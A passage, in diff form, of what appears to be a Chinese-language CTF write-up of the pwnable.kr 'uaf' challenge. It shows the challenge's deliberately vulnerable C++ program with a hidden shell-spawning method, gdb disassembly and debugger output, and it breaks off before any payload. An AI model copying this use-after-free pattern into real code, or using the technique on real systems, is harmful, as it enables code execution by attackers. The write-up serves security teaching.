@@ -10306,3 +10306,609 @@ FuN_w1th_5h3ll_v4riabl3s_haha
 
 ------
 
+### uaf
+
+这是**Pwnable.kr**的第十六个挑战`uaf`，来自**[Toddler's Bottle]**部分。题目`uaf`是`Use After Free`的缩写，这是一种当程序在其指向的内存被释放后继续使用指针时发生的漏洞。
+
+```bash
+Mommy, what is Use After Free bug?
+
+ssh uaf@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh uaf@pwnable.kr -p2222
+uaf@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Fri Jun  9 14:35:44 2023 from 213.57.214.225
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+uaf@pwnable:~$ ls -la
+total 44
+drwxr-x---   5 root uaf      4096 Oct 23  2016 .
+drwxr-xr-x 117 root root     4096 Nov 10  2022 ..
+d---------   2 root root     4096 Sep 21  2015 .bash_history
+-rw-r-----   1 root uaf_pwn    22 Sep 26  2015 flag
+dr-xr-xr-x   2 root root     4096 Sep 21  2015 .irssi
+drwxr-xr-x   2 root root     4096 Oct 23  2016 .pwntools-cache
+-r-xr-sr-x   1 root uaf_pwn 15463 Sep 26  2015 uaf
+-rw-r--r--   1 root root     1431 Sep 26  2015 uaf.cpp
+```
+
+我们可以看到三个文件`uaf`、`uaf.cpp`和`flag`，其中`uaf`是`ELF`二进制可执行文件，`uaf.c`是编译二进制文件的`C++`代码，用户`uaf`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat uaf.cpp`来查看`uaf.cpp`的代码。
+
+```C++
+uaf@pwnable:~$ cat uaf.cpp
+#include <fcntl.h>
+#include <iostream> 
+#include <cstring>
+#include <cstdlib>
+#include <unistd.h>
+using namespace std;
+
+class Human{
+private:
+    virtual void give_shell(){
+        system("/bin/sh");
+    }
+protected:
+    int age;
+    string name;
+public:
+    virtual void introduce(){
+        cout << "My name is " << name << endl;
+        cout << "I am " << age << " years old" << endl;
+    }
+};
+
+class Man: public Human{
+public:
+    Man(string name, int age){
+        this->name = name;
+        this->age = age;
+    }
+    virtual void introduce(){
+        Human::introduce();
+        cout << "I am a nice guy!" << endl;
+    }
+};
+
+class Woman: public Human{
+public:
+    Woman(string name, int age){
+        this->name = name;
+        this->age = age;
+    }
+    virtual void introduce(){
+        Human::introduce();
+        cout << "I am a cute girl!" << endl;
+    }
+};
+
+int main(int argc, char* argv[]){
+    Human* m = new Man("Jack", 25);
+    Human* w = new Woman("Jill", 21);
+
+    size_t len;
+    char* data;
+    unsigned int op;
+    while(1){
+        cout << "1. use\n2. after\n3. free\n";
+        cin >> op;
+
+        switch(op){
+            case 1:
+                m->introduce();
+                w->introduce();
+                break;
+            case 2:
+                len = atoi(argv[1]);
+                data = new char[len];
+                read(open(argv[2], O_RDONLY), data, len);
+                cout << "your data is allocated" << endl;
+                break;
+            case 3:
+                delete m;
+                delete w;
+                break;
+            default:
+                break;
+        }
+    }
+    return 0;
+}
+```
+
+首先程序分配了两个实例，一个`Man`，一个`Woman`，这俩个类都继承自基类`Human`，它们也因此继承了`Human`类的所有方法（`give_shell()`和`introduce()`）。之后程序进入了一个`while(1)`循环无限请求输入，用户有三个选项。`use after free`嘛，如果我们直接选择`3`再选择`1`的话，程序会出现段错误并结束运行。
+
+```bash
+uaf@pwnable:~$ ./uaf
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+1
+Segmentation fault (core dumped)
+```
+
+我们重点来看选项`2`，选项`2`从`argv[2]`提供的文件中读取`argv[1]`个字节的数据并存储在变量`data`中，而变量`data`是使用关键字`new`创建、存储在堆中的。简单来说就是，选项`2`分配一定大小的内存块来读取用户输入的内容。我们用`gdb`来进一步了解该程序。
+
+```assembly
+uaf@pwnable:~$ gdb ./uaf
+(gdb) set disassembly-flavor intel  # Intel Style
+(gdb) disass main
+Dump of assembler code for function main:
+   0x0000000000400ec4 <+0>:     push   rbp
+   0x0000000000400ec5 <+1>:     mov    rbp,rsp
+   0x0000000000400ec8 <+4>:     push   r12
+   0x0000000000400eca <+6>:     push   rbx
+   0x0000000000400ecb <+7>:     sub    rsp,0x50
+   0x0000000000400ecf <+11>:    mov    DWORD PTR [rbp-0x54],edi
+   0x0000000000400ed2 <+14>:    mov    QWORD PTR [rbp-0x60],rsi
+   0x0000000000400ed6 <+18>:    lea    rax,[rbp-0x12]
+   0x0000000000400eda <+22>:    mov    rdi,rax
+   0x0000000000400edd <+25>:    call   0x400d70 <std::allocator<char>::allocator()@plt>
+   0x0000000000400ee2 <+30>:    lea    rdx,[rbp-0x12]
+   0x0000000000400ee6 <+34>:    lea    rax,[rbp-0x50]
+   0x0000000000400eea <+38>:    mov    esi,0x4014f0
+   0x0000000000400eef <+43>:    mov    rdi,rax
+   0x0000000000400ef2 <+46>:    call   0x400d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&)@plt>
+   0x0000000000400ef7 <+51>:    lea    r12,[rbp-0x50]
+   0x0000000000400efb <+55>:    mov    edi,0x18
+   0x0000000000400f00 <+60>:    call   0x400d90 <operator new(unsigned long)@plt>   # 创建一个新的堆块
+   0x0000000000400f05 <+65>:    mov    rbx,rax
+   0x0000000000400f08 <+68>:    mov    edx,0x19
+   0x0000000000400f0d <+73>:    mov    rsi,r12
+   0x0000000000400f10 <+76>:    mov    rdi,rbx
+   0x0000000000400f13 <+79>:    call   0x401264 <Man::Man(std::string, int)>   # 调用Man()的构造函数
+   0x0000000000400f18 <+84>:    mov    QWORD PTR [rbp-0x38],rbx
+   0x0000000000400f1c <+88>:    lea    rax,[rbp-0x50]
+   0x0000000000400f20 <+92>:    mov    rdi,rax
+   0x0000000000400f23 <+95>:    call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
+   0x0000000000400f28 <+100>:   lea    rax,[rbp-0x12]
+   0x0000000000400f2c <+104>:   mov    rdi,rax
+   0x0000000000400f2f <+107>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
+   0x0000000000400f34 <+112>:   lea    rax,[rbp-0x11]
+   0x0000000000400f38 <+116>:   mov    rdi,rax
+   0x0000000000400f3b <+119>:   call   0x400d70 <std::allocator<char>::allocator()@plt>
+   0x0000000000400f40 <+124>:   lea    rdx,[rbp-0x11]
+   0x0000000000400f44 <+128>:   lea    rax,[rbp-0x40]
+   0x0000000000400f48 <+132>:   mov    esi,0x4014f5
+   0x0000000000400f4d <+137>:   mov    rdi,rax
+   0x0000000000400f50 <+140>:   call   0x400d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&)@plt>
+   0x0000000000400f55 <+145>:   lea    r12,[rbp-0x40]
+   0x0000000000400f59 <+149>:   mov    edi,0x18
+   0x0000000000400f5e <+154>:   call   0x400d90 <operator new(unsigned long)@plt>
+   0x0000000000400f63 <+159>:   mov    rbx,rax
+   0x0000000000400f66 <+162>:   mov    edx,0x15
+   0x0000000000400f6b <+167>:   mov    rsi,r12
+   0x0000000000400f6e <+170>:   mov    rdi,rbx
+   0x0000000000400f71 <+173>:   call   0x401308 <Woman::Woman(std::string, int)>
+   0x0000000000400f76 <+178>:   mov    QWORD PTR [rbp-0x30],rbx
+   0x0000000000400f7a <+182>:   lea    rax,[rbp-0x40]
+   0x0000000000400f7e <+186>:   mov    rdi,rax
+   0x0000000000400f81 <+189>:   call   0x400d00 <std::basic_string<char, std::char_traits<char>, s
+td::allocator<char> >::~basic_string()@plt>
+   0x0000000000400f86 <+194>:   lea    rax,[rbp-0x11]
+   0x0000000000400f8a <+198>:   mov    rdi,rax
+   0x0000000000400f8d <+201>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
+   0x0000000000400f92 <+206>:   mov    esi,0x4014fa
+   0x0000000000400f97 <+211>:   mov    edi,0x602260
+   0x0000000000400f9c <+216>:   call   0x400cf0 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
+   0x0000000000400fa1 <+221>:   lea    rax,[rbp-0x18]
+   0x0000000000400fa5 <+225>:   mov    rsi,rax
+   0x0000000000400fa8 <+228>:   mov    edi,0x6020e0
+   0x0000000000400fad <+233>:   call   0x400dd0 <std::istream::operator>>(unsigned int&)@plt>
+   0x0000000000400fb2 <+238>:   mov    eax,DWORD PTR [rbp-0x18]
+   0x0000000000400fb5 <+241>:   cmp    eax,0x2
+   0x0000000000400fb8 <+244>:   je     0x401000 <main+316>
+   0x0000000000400fba <+246>:   cmp    eax,0x3
+   0x0000000000400fbd <+249>:   je     0x401076 <main+434>
+   0x0000000000400fc3 <+255>:   cmp    eax,0x1
+   0x0000000000400fc6 <+258>:   je     0x400fcd <main+265>
+   0x0000000000400fc8 <+260>:   jmp    0x4010a9 <main+485>
+   0x0000000000400fcd <+265>:   mov    rax,QWORD PTR [rbp-0x38]
+   0x0000000000400fd1 <+269>:   mov    rax,QWORD PTR [rax]
+   0x0000000000400fd4 <+272>:   add    rax,0x8
+   0x0000000000400fd8 <+276>:   mov    rdx,QWORD PTR [rax]
+   0x0000000000400fdb <+279>:   mov    rax,QWORD PTR [rbp-0x38]
+   0x0000000000400fdf <+283>:   mov    rdi,rax
+   0x0000000000400fe2 <+286>:   call   rdx
+   0x0000000000400fe4 <+288>:   mov    rax,QWORD PTR [rbp-0x30]
+   0x0000000000400fe8 <+292>:   mov    rax,QWORD PTR [rax]
+   0x0000000000400feb <+295>:   add    rax,0x8
+   0x0000000000400fef <+299>:   mov    rdx,QWORD PTR [rax]
+   0x0000000000400ff2 <+302>:   mov    rax,QWORD PTR [rbp-0x30]
+   0x0000000000400ff6 <+306>:   mov    rdi,rax
+   0x0000000000400ff9 <+309>:   call   rdx
+   0x0000000000400ffb <+311>:   jmp    0x4010a9 <main+485>
+   0x0000000000401000 <+316>:   mov    rax,QWORD PTR [rbp-0x60]
+   0x0000000000401004 <+320>:   add    rax,0x8
+   0x0000000000401008 <+324>:   mov    rax,QWORD PTR [rax]
+   0x000000000040100b <+327>:   mov    rdi,rax
+   0x000000000040100e <+330>:   call   0x400d20 <atoi@plt>
+   0x0000000000401013 <+335>:   cdqe   
+   0x0000000000401015 <+337>:   mov    QWORD PTR [rbp-0x28],rax
+   0x0000000000401019 <+341>:   mov    rax,QWORD PTR [rbp-0x28]
+   0x000000000040101d <+345>:   mov    rdi,rax
+   0x0000000000401020 <+348>:   call   0x400c70 <operator new[](unsigned long)@plt>
+   0x0000000000401025 <+353>:   mov    QWORD PTR [rbp-0x20],rax
+   0x0000000000401029 <+357>:   mov    rax,QWORD PTR [rbp-0x60]
+   0x000000000040102d <+361>:   add    rax,0x10
+   0x0000000000401031 <+365>:   mov    rax,QWORD PTR [rax]
+   0x0000000000401034 <+368>:   mov    esi,0x0
+   0x0000000000401039 <+373>:   mov    rdi,rax
+   0x000000000040103c <+376>:   mov    eax,0x0
+   0x0000000000401041 <+381>:   call   0x400dc0 <open@plt>
+   0x0000000000401046 <+386>:   mov    rdx,QWORD PTR [rbp-0x28]
+   0x000000000040104a <+390>:   mov    rcx,QWORD PTR [rbp-0x20]
+   0x000000000040104e <+394>:   mov    rsi,rcx
+   0x0000000000401051 <+397>:   mov    edi,eax
+   0x0000000000401053 <+399>:   call   0x400ca0 <read@plt>
+   0x0000000000401058 <+404>:   mov    esi,0x401513
+   0x000000000040105d <+409>:   mov    edi,0x602260
+   0x0000000000401062 <+414>:   call   0x400cf0 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
+   0x0000000000401067 <+419>:   mov    esi,0x400d60
+   0x000000000040106c <+424>:   mov    rdi,rax
+   0x000000000040106f <+427>:   call   0x400d50 <std::ostream::operator<<(std::ostream& (*)(std::ostream&))@plt>
+   0x0000000000401074 <+432>:   jmp    0x4010a9 <main+485>
+   0x0000000000401076 <+434>:   mov    rbx,QWORD PTR [rbp-0x38]
+   0x000000000040107a <+438>:   test   rbx,rbx
+   0x000000000040107d <+441>:   je     0x40108f <main+459>
+   0x000000000040107f <+443>:   mov    rdi,rbx
+   0x0000000000401082 <+446>:   call   0x40123a <Human::~Human()>
+   0x0000000000401087 <+451>:   mov    rdi,rbx
+   0x000000000040108a <+454>:   call   0x400c80 <operator delete(void*)@plt>
+   0x000000000040108f <+459>:   mov    rbx,QWORD PTR [rbp-0x30]
+   0x0000000000401093 <+463>:   test   rbx,rbx
+   0x0000000000401096 <+466>:   je     0x4010a8 <main+484>
+   0x0000000000401098 <+468>:   mov    rdi,rbx
+   0x000000000040109b <+471>:   call   0x40123a <Human::~Human()>
+   0x00000000004010a0 <+476>:   mov    rdi,rbx
+   0x00000000004010a3 <+479>:   call   0x400c80 <operator delete(void*)@plt>
+   0x00000000004010a8 <+484>:   nop
+   0x00000000004010a9 <+485>:   jmp    0x400f92 <main+206>
+   0x00000000004010ae <+490>:   mov    r12,rax
+   0x00000000004010b1 <+493>:   mov    rdi,rbx
+   0x00000000004010b4 <+496>:   call   0x400c80 <operator delete(void*)@plt>
+   0x00000000004010b9 <+501>:   mov    rbx,r12
+   0x00000000004010bc <+504>:   jmp    0x4010c1 <main+509>
+   0x00000000004010be <+506>:   mov    rbx,rax
+   0x00000000004010c1 <+509>:   lea    rax,[rbp-0x50]
+   0x00000000004010c5 <+513>:   mov    rdi,rax
+   0x00000000004010c8 <+516>:   call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
+   0x00000000004010cd <+521>:   jmp    0x4010d2 <main+526>
+   0x00000000004010cf <+523>:   mov    rbx,rax
+   0x00000000004010d2 <+526>:   lea    rax,[rbp-0x12]
+   0x00000000004010d6 <+530>:   mov    rdi,rax
+   0x00000000004010d9 <+533>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
+   0x00000000004010de <+538>:   mov    rax,rbx
+   0x00000000004010e1 <+541>:   mov    rdi,rax
+   0x00000000004010e4 <+544>:   call   0x400da0 <_Unwind_Resume@plt>
+   0x00000000004010e9 <+549>:   mov    r12,rax
+   0x00000000004010ec <+552>:   mov    rdi,rbx
+   0x00000000004010ef <+555>:   call   0x400c80 <operator delete(void*)@plt>
+   0x00000000004010f4 <+560>:   mov    rbx,r12
+   0x00000000004010f7 <+563>:   jmp    0x4010fc <main+568>
+   0x00000000004010f9 <+565>:   mov    rbx,rax
+   0x00000000004010fc <+568>:   lea    rax,[rbp-0x40]
+   0x0000000000401100 <+572>:   mov    rdi,rax
+   0x0000000000401103 <+575>:   call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
+   0x0000000000401108 <+580>:   jmp    0x40110d <main+585>
+   0x000000000040110a <+582>:   mov    rbx,rax
+   0x000000000040110d <+585>:   lea    rax,[rbp-0x11]
+   0x0000000000401111 <+589>:   mov    rdi,rax
+   0x0000000000401114 <+592>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
+   0x0000000000401119 <+597>:   mov    rax,rbx
+   0x000000000040111c <+600>:   mov    rdi,rax
+   0x000000000040111f <+603>:   call   0x400da0 <_Unwind_Resume@plt>
+End of assembler dump.
+(gdb) b *main+84
+Breakpoint 1 at 0x400f18
+(gdb) run
+Starting program: /home/uaf/uaf 
+
+Breakpoint 1, 0x0000000000400f18 in main ()
+```
+
+该程序中各个类的内存分布如下，一共需要`24`比特，所以堆的块大小应该是`32`比特。
+
+| offset |             class Human              |             class Man              |             class Woman              |
+| :----: | :----------------------------------: | :--------------------------------: | :----------------------------------: |
+|   +0   | a pointer to `Human` class's vftable | a pointer to `Man` class's vftable | a pointer to `Woman` class's vftable |
+|   +8   |               int age                |              int age               |               int age                |
+|  +16   |           std::string name           |          std::string name          |           std::string name           |
+|  +24   |                (end)                 |               (end)                |                (end)                 |
+
+我们可以把二进制文件下载到本地用`pwndbg`进行分析，这样就可以比`gdb`更好地查看该程序的信息啦。
+
+```assembly
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ sudo chmod +x ./uaf
+$ gdb ./uaf
+pwndbg> set print asm-demangle on
+pwndbg> disass main
+Dump of assembler code for function main:
+   0x0000000000400ec4 <+0>:     push   rbp
+   0x0000000000400ec5 <+1>:     mov    rbp,rsp
+   0x0000000000400ec8 <+4>:     push   r12
+   0x0000000000400eca <+6>:     push   rbx
+   0x0000000000400ecb <+7>:     sub    rsp,0x50
+   0x0000000000400ecf <+11>:    mov    DWORD PTR [rbp-0x54],edi
+   0x0000000000400ed2 <+14>:    mov    QWORD PTR [rbp-0x60],rsi
+   0x0000000000400ed6 <+18>:    lea    rax,[rbp-0x12]
+   0x0000000000400eda <+22>:    mov    rdi,rax
+   0x0000000000400edd <+25>:    call   0x400d70 <std::allocator<char>::allocator()@plt>
+   0x0000000000400ee2 <+30>:    lea    rdx,[rbp-0x12]
+   0x0000000000400ee6 <+34>:    lea    rax,[rbp-0x50]
+   0x0000000000400eea <+38>:    mov    esi,0x4014f0
+   0x0000000000400eef <+43>:    mov    rdi,rax
+   0x0000000000400ef2 <+46>:    call   0x400d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&)@plt>                
+   0x0000000000400ef7 <+51>:    lea    r12,[rbp-0x50]
+   0x0000000000400efb <+55>:    mov    edi,0x18
+   0x0000000000400f00 <+60>:    call   0x400d90 <operator new(unsigned long)@plt>
+   0x0000000000400f05 <+65>:    mov    rbx,rax
+   0x0000000000400f08 <+68>:    mov    edx,0x19
+   0x0000000000400f0d <+73>:    mov    rsi,r12
+   0x0000000000400f10 <+76>:    mov    rdi,rbx
+   0x0000000000400f13 <+79>:    call   0x401264 <Man::Man(std::string, int)>
+   0x0000000000400f18 <+84>:    mov    QWORD PTR [rbp-0x38],rbx
+   0x0000000000400f1c <+88>:    lea    rax,[rbp-0x50]
+   0x0000000000400f20 <+92>:    mov    rdi,rax
+   0x0000000000400f23 <+95>:    call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>                                                       
+   0x0000000000400f28 <+100>:   lea    rax,[rbp-0x12]
+   0x0000000000400f2c <+104>:   mov    rdi,rax
+   0x0000000000400f2f <+107>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
+   0x0000000000400f34 <+112>:   lea    rax,[rbp-0x11]
+   0x0000000000400f38 <+116>:   mov    rdi,rax
+   0x0000000000400f3b <+119>:   call   0x400d70 <std::allocator<char>::allocator()@plt>
+   0x0000000000400f40 <+124>:   lea    rdx,[rbp-0x11]
+   0x0000000000400f44 <+128>:   lea    rax,[rbp-0x40]
+   0x0000000000400f48 <+132>:   mov    esi,0x4014f5
+   0x0000000000400f4d <+137>:   mov    rdi,rax
+   0x0000000000400f50 <+140>:   call   0x400d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&)@plt>                
+   0x0000000000400f55 <+145>:   lea    r12,[rbp-0x40]
+   0x0000000000400f59 <+149>:   mov    edi,0x18
+   0x0000000000400f5e <+154>:   call   0x400d90 <operator new(unsigned long)@plt>
+   0x0000000000400f63 <+159>:   mov    rbx,rax
+   0x0000000000400f66 <+162>:   mov    edx,0x15
+   0x0000000000400f6b <+167>:   mov    rsi,r12
+   0x0000000000400f6e <+170>:   mov    rdi,rbx
+   0x0000000000400f71 <+173>:   call   0x401308 <Woman::Woman(std::string, int)>
+   0x0000000000400f76 <+178>:   mov    QWORD PTR [rbp-0x30],rbx
+   0x0000000000400f7a <+182>:   lea    rax,[rbp-0x40]
+   0x0000000000400f7e <+186>:   mov    rdi,rax
+   0x0000000000400f81 <+189>:   call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>                                                       
+   0x0000000000400f86 <+194>:   lea    rax,[rbp-0x11]
+   0x0000000000400f8a <+198>:   mov    rdi,rax
+   0x0000000000400f8d <+201>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
+   0x0000000000400f92 <+206>:   mov    esi,0x4014fa
+   0x0000000000400f97 <+211>:   mov    edi,0x602260
+   0x0000000000400f9c <+216>:   call   0x400cf0 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>                                                                                   
+   0x0000000000400fa1 <+221>:   lea    rax,[rbp-0x18]
+   0x0000000000400fa5 <+225>:   mov    rsi,rax
+   0x0000000000400fa8 <+228>:   mov    edi,0x6020e0
+   0x0000000000400fad <+233>:   call   0x400dd0 <std::istream::operator>>(unsigned int&)@plt>
+   0x0000000000400fb2 <+238>:   mov    eax,DWORD PTR [rbp-0x18]
+   0x0000000000400fb5 <+241>:   cmp    eax,0x2
+   0x0000000000400fb8 <+244>:   je     0x401000 <main+316>
+   0x0000000000400fba <+246>:   cmp    eax,0x3
+   0x0000000000400fbd <+249>:   je     0x401076 <main+434>
+   0x0000000000400fc3 <+255>:   cmp    eax,0x1
+   0x0000000000400fc6 <+258>:   je     0x400fcd <main+265>
+   0x0000000000400fc8 <+260>:   jmp    0x4010a9 <main+485>
+   0x0000000000400fcd <+265>:   mov    rax,QWORD PTR [rbp-0x38]
+   0x0000000000400fd1 <+269>:   mov    rax,QWORD PTR [rax]
+   0x0000000000400fd4 <+272>:   add    rax,0x8
+   0x0000000000400fd8 <+276>:   mov    rdx,QWORD PTR [rax]
+   0x0000000000400fdb <+279>:   mov    rax,QWORD PTR [rbp-0x38]
+   0x0000000000400fdf <+283>:   mov    rdi,rax
+   0x0000000000400fe2 <+286>:   call   rdx
+   0x0000000000400fe4 <+288>:   mov    rax,QWORD PTR [rbp-0x30]
+   0x0000000000400fe8 <+292>:   mov    rax,QWORD PTR [rax]
+   0x0000000000400feb <+295>:   add    rax,0x8
+   0x0000000000400fef <+299>:   mov    rdx,QWORD PTR [rax]
+   0x0000000000400ff2 <+302>:   mov    rax,QWORD PTR [rbp-0x30]
+   0x0000000000400ff6 <+306>:   mov    rdi,rax
+   0x0000000000400ff9 <+309>:   call   rdx
+   0x0000000000400ffb <+311>:   jmp    0x4010a9 <main+485>
+   0x0000000000401000 <+316>:   mov    rax,QWORD PTR [rbp-0x60]
+   0x0000000000401004 <+320>:   add    rax,0x8
+   0x0000000000401008 <+324>:   mov    rax,QWORD PTR [rax]
+   0x000000000040100b <+327>:   mov    rdi,rax
+   0x000000000040100e <+330>:   call   0x400d20 <atoi@plt>
+   0x0000000000401013 <+335>:   cdqe   
+   0x0000000000401015 <+337>:   mov    QWORD PTR [rbp-0x28],rax
+   0x0000000000401019 <+341>:   mov    rax,QWORD PTR [rbp-0x28]
+   0x000000000040101d <+345>:   mov    rdi,rax
+   0x0000000000401020 <+348>:   call   0x400c70 <operator new[](unsigned long)@plt>
+   0x0000000000401025 <+353>:   mov    QWORD PTR [rbp-0x20],rax
+   0x0000000000401029 <+357>:   mov    rax,QWORD PTR [rbp-0x60]
+   0x000000000040102d <+361>:   add    rax,0x10
+   0x0000000000401031 <+365>:   mov    rax,QWORD PTR [rax]
+   0x0000000000401034 <+368>:   mov    esi,0x0
+   0x0000000000401039 <+373>:   mov    rdi,rax
+   0x000000000040103c <+376>:   mov    eax,0x0
+   0x0000000000401041 <+381>:   call   0x400dc0 <open@plt>
+   0x0000000000401046 <+386>:   mov    rdx,QWORD PTR [rbp-0x28]
+   0x000000000040104a <+390>:   mov    rcx,QWORD PTR [rbp-0x20]
+   0x000000000040104e <+394>:   mov    rsi,rcx
+   0x0000000000401051 <+397>:   mov    edi,eax
+   0x0000000000401053 <+399>:   call   0x400ca0 <read@plt>
+   0x0000000000401058 <+404>:   mov    esi,0x401513
+   0x000000000040105d <+409>:   mov    edi,0x602260
+   0x0000000000401062 <+414>:   call   0x400cf0 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>                                                                                   
+   0x0000000000401067 <+419>:   mov    esi,0x400d60
+   0x000000000040106c <+424>:   mov    rdi,rax
+   0x000000000040106f <+427>:   call   0x400d50 <std::ostream::operator<<(std::ostream& (*)(std::ostream&))@plt>                                                                                    
+   0x0000000000401074 <+432>:   jmp    0x4010a9 <main+485>
+   0x0000000000401076 <+434>:   mov    rbx,QWORD PTR [rbp-0x38]
+   0x000000000040107a <+438>:   test   rbx,rbx
+   0x000000000040107d <+441>:   je     0x40108f <main+459>
+   0x000000000040107f <+443>:   mov    rdi,rbx
+   0x0000000000401082 <+446>:   call   0x40123a <Human::~Human()>
+   0x0000000000401087 <+451>:   mov    rdi,rbx
+   0x000000000040108a <+454>:   call   0x400c80 <operator delete(void*)@plt>
+   0x000000000040108f <+459>:   mov    rbx,QWORD PTR [rbp-0x30]
+   0x0000000000401093 <+463>:   test   rbx,rbx
+   0x0000000000401096 <+466>:   je     0x4010a8 <main+484>
+   0x0000000000401098 <+468>:   mov    rdi,rbx
+   0x000000000040109b <+471>:   call   0x40123a <Human::~Human()>
+   0x00000000004010a0 <+476>:   mov    rdi,rbx
+   0x00000000004010a3 <+479>:   call   0x400c80 <operator delete(void*)@plt>
+   0x00000000004010a8 <+484>:   nop
+   0x00000000004010a9 <+485>:   jmp    0x400f92 <main+206>
+   0x00000000004010ae <+490>:   mov    r12,rax
+   0x00000000004010b1 <+493>:   mov    rdi,rbx
+   0x00000000004010b4 <+496>:   call   0x400c80 <operator delete(void*)@plt>
+   0x00000000004010b9 <+501>:   mov    rbx,r12
+   0x00000000004010bc <+504>:   jmp    0x4010c1 <main+509>
+   0x00000000004010be <+506>:   mov    rbx,rax
+   0x00000000004010c1 <+509>:   lea    rax,[rbp-0x50]
+   0x00000000004010c5 <+513>:   mov    rdi,rax
+   0x00000000004010c8 <+516>:   call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>                                                       
+   0x00000000004010cd <+521>:   jmp    0x4010d2 <main+526>
+   0x00000000004010cf <+523>:   mov    rbx,rax
+   0x00000000004010d2 <+526>:   lea    rax,[rbp-0x12]
+   0x00000000004010d6 <+530>:   mov    rdi,rax
+   0x00000000004010d9 <+533>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
+   0x00000000004010de <+538>:   mov    rax,rbx
+   0x00000000004010e1 <+541>:   mov    rdi,rax
+   0x00000000004010e4 <+544>:   call   0x400da0 <_Unwind_Resume@plt>
+   0x00000000004010e9 <+549>:   mov    r12,rax
+   0x00000000004010ec <+552>:   mov    rdi,rbx
+   0x00000000004010ef <+555>:   call   0x400c80 <operator delete(void*)@plt>
+   0x00000000004010f4 <+560>:   mov    rbx,r12
+   0x00000000004010f7 <+563>:   jmp    0x4010fc <main+568>
+   0x00000000004010f9 <+565>:   mov    rbx,rax
+   0x00000000004010fc <+568>:   lea    rax,[rbp-0x40]
+   0x0000000000401100 <+572>:   mov    rdi,rax
+   0x0000000000401103 <+575>:   call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>                                                       
+   0x0000000000401108 <+580>:   jmp    0x40110d <main+585>
+   0x000000000040110a <+582>:   mov    rbx,rax
+   0x000000000040110d <+585>:   lea    rax,[rbp-0x11]
+   0x0000000000401111 <+589>:   mov    rdi,rax
+   0x0000000000401114 <+592>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
+   0x0000000000401119 <+597>:   mov    rax,rbx
+   0x000000000040111c <+600>:   mov    rdi,rax
+   0x000000000040111f <+603>:   call   0x400da0 <_Unwind_Resume@plt>
+End of assembler dump.
+pwndbg> b *main+84
+Breakpoint 1 at 0x400f18
+pwndbg> run
+Starting program: /home/tyd/ctf/pwn/pwnable.kr/uaf 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x0000000000400f18 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
+ RAX  0x614ee0 —▸ 0x401570 —▸ 0x40117a (Human::give_shell()) ◂— push   rbp
+ RBX  0x614ee0 —▸ 0x401570 —▸ 0x40117a (Human::give_shell()) ◂— push   rbp
+ RCX  0x7ffff7bf95d8 (__libc_single_threaded) ◂— 0x1
+ RDX  0x19
+ RDI  0x7ffff7e195c0 (std::string::_Rep::_S_empty_rep_storage) ◂— 0x0
+ RSI  0x7fffffffddc0 —▸ 0x614ec8 ◂— 0x6b63614a /* 'Jack' */
+ R8   0x7ffff7bf1c60 (main_arena) ◂— 0x0
